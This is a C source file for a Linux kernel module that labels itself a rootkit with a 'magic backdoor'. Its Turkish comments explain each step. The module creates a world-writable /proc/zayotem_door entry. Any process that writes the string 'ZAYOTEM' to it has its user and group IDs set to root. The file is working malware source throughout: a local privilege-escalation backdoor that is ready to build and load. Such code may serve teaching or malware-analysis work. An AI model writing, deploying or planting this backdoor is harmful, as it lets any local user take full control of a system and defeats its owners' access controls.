#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Muzaffer Murat Kilit");
MODULE_DESCRIPTION("LKM Rootkit - Magic Backdoor");

static struct proc_dir_entry *zayotem_proc;

//Kernel'a disaridan veri yazildiginda tetiklenecek fonksiyon
static ssize_t magic_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos) {
    char buf[16];
    int to_copy = count < sizeof(buf) ? count : sizeof(buf) - 1;
    
    if (copy_from_user(buf, ubuf, to_copy)) return -EFAULT;
    buf[to_copy] = '\0';

    //Eger magic word ("ZAYOTEM") gelirse, cagiran processin yetkilerini root yap (DKOM)
    if (strncmp(buf, "ZAYOTEM", 7) == 0) {
        struct cred *new_creds = prepare_creds();
        if (new_creds) {
            new_creds->uid.val = new_creds->euid.val = 0; // Root yetkisi
            new_creds->gid.val = new_creds->egid.val = 0;
            commit_creds(new_creds);
            printk(KERN_INFO "[ZAYOTEM-ROOTKIT] Magic word tetiklendi! Kullaniciya Ring 0 uzerinden UID 0 verildi.\n");
        }
    }
    return count;
}

static const struct proc_ops proc_fops = {
    .proc_write = magic_write,
};

static int __init rootkit_init(void) {
    //proc altinda gizli arayuz olustur (Herkes yazabilir: 0666)
    zayotem_proc = proc_create("zayotem_door", 0666, NULL, &proc_fops);
    printk(KERN_INFO "[ZAYOTEM-ROOTKIT] Modul yuklendi. /proc/zayotem_door acildi.\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    proc_remove(zayotem_proc);
    printk(KERN_INFO "[ZAYOTEM-ROOTKIT] Modul kaldirildi.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);